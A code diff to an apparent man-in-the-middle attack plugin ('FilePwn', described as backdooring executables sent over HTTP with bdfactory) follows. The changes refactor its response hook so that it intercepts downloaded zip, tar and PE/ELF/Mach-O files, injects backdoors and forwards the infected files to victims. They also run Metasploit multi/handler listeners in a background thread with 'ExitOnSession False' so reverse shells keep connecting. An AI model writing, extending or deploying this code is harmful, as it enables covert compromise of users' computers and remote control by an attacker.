@@ -61,6 +61,7 @@ import logging
 import shutil
 import random
 import string
+import threading
 import tarfile
 import multiprocessing
 
@@ -78,8 +79,7 @@ class FilePwn(Plugin):
     name        = "FilePwn"
     optname     = "filepwn"
     desc        = "Backdoor executables being sent over http using bdfactory"
-    implements  = ["handleResponse"]
-    tree_output = ["BDFProxy v0.3.2 online"]
+    tree_info = ["BDFProxy v0.3.2 online"]
     version     = "0.3"
     has_opts    = False
 
@@ -134,17 +134,23 @@ class FilePwn(Plugin):
             msf = Msfrpc({"host": rpcip})  #create an instance of msfrpc libarary
             msf.login('msf', rpcpass)
             version = msf.call('core.version')['version']
-            self.tree_output.append("Connected to Metasploit v{}".format(version))
+            self.tree_info.append("Connected to Metasploit v{}".format(version))
+            
+            t = threading.Thread(name='setupMSF', target=self.setupMSF, args=(msf,))
+            t.setDaemon(True)
+            t.start()
         except Exception:
             sys.exit("[-] Error connecting to MSF! Make sure you started Metasploit and its MSGRPC server")
+
+    def setupMSF(self, msf):
         
-        self.tree_output.append("Setting up Metasploit payload handlers")
         jobs = msf.call('job.list')
         for config in [self.LinuxIntelx86, self.LinuxIntelx64, self.WindowsIntelx86, self.WindowsIntelx64, self.MachoIntelx86, self.MachoIntelx64]:
             cmd = "use exploit/multi/handler\n"
             cmd += "set payload {}\n".format(config["MSFPAYLOAD"])
             cmd += "set LHOST {}\n".format(config["HOST"])
             cmd += "set LPORT {}\n".format(config["PORT"])
+            cmd += "set ExitOnSession False\n"
             cmd += "exploit -j\n"
 
             if jobs:
@@ -589,46 +595,46 @@ class FilePwn(Plugin):
             self.patched.put(tempZipFile)
             return
 
-    def handleResponse(self, request, data):
+    def serverResponse(self, response, request, data):
 
-        content_header = request.client.headers['Content-Type']
-        client_ip = request.client.getClientIP()
+        content_header = response.headers['Content-Type']
+        client_ip      = response.getClientIP()
 
         if content_header in self.zipMimeTypes:
             
             if self.bytes_have_format(data, 'zip'):
-                mitmf_logger.info("{} Detected supported zip file type!".format(client_ip))
+                mitmf_logger.info("[FilePwn] {} Detected supported zip file type!".format(client_ip))
                 
                 process = multiprocessing.Process(name='zip', target=self.zip, args=(data,))
                 process.daemon = True
                 process.start()
-                process.join()
+                #process.join()
                 bd_zip = self.patched.get()
 
                 if bd_zip:
-                    mitmf_logger.info("{} Patching complete, forwarding to client".format(client_ip))
-                    return {'request': request, 'data': bd_zip}
+                    mitmf_logger.info("[FilePwn] {} Patching complete, forwarding to client".format(client_ip))
+                    return {'response': response, 'request': request, 'data': bd_zip}
 
             else:
                 for tartype in ['gz','bz','tar']:
                     if self.bytes_have_format(data, tartype):
-                        mitmf_logger.info("{} Detected supported tar file type!".format(client_ip))
+                        mitmf_logger.info("[FilePwn] {} Detected supported tar file type!".format(client_ip))
                         
                         process = multiprocessing.Process(name='tar_files', target=self.tar_files, args=(data,))
                         process.daemon = True
                         process.start()
-                        process.join()
+                        #process.join()
                         bd_tar = self.patched.get()
 
                         if bd_tar:
-                            mitmf_logger.info("{} Patching complete, forwarding to client".format(client_ip))
-                            return {'request': request, 'data': bd_tar}
+                            mitmf_logger.info("[FilePwn] {} Patching complete, forwarding to client".format(client_ip))
+                            return {'response': response, 'request': request, 'data': bd_tar}
 
         
         elif content_header in self.binaryMimeTypes:
             for bintype in ['pe','elf','fatfile','machox64','machox86']:
                 if self.bytes_have_format(data, bintype):
-                    mitmf_logger.info("{} Detected supported binary type!".format(client_ip))
+                    mitmf_logger.info("[FilePwn] {} Detected supported binary type ({})!".format(client_ip, bintype))
                     fd, tmpFile = mkstemp()
                     with open(tmpFile, 'w') as f:
                         f.write(data)
@@ -636,15 +642,14 @@ class FilePwn(Plugin):
                     process = multiprocessing.Process(name='binaryGrinder', target=self.binaryGrinder, args=(tmpFile,))
                     process.daemon = True
                     process.start()
-                    process.join()
+                    #process.join()
                     patchb = self.patched.get()
 
                     if patchb:
                         bd_binary = open("backdoored/" + os.path.basename(tmpFile), "rb").read()
                         os.remove('./backdoored/' + os.path.basename(tmpFile))
-                        mitmf_logger.info("{} Patching complete, forwarding to client".format(client_ip))
-                        return {'request': request, 'data': bd_binary}
+                        mitmf_logger.info("[FilePwn] {} Patching complete, forwarding to client".format(client_ip))
+                        return {'response': response, 'request': request, 'data': bd_binary}
 
-        else:
-            mitmf_logger.debug("{} File is not of supported Content-Type: {}".format(client_ip, content_header))
-            return {'request': request, 'data': data}
+        mitmf_logger.debug("[FilePwn] {} File is not of supported Content-Type: {}".format(client_ip, content_header))
+        return {'response': response, 'request': request, 'data': data}
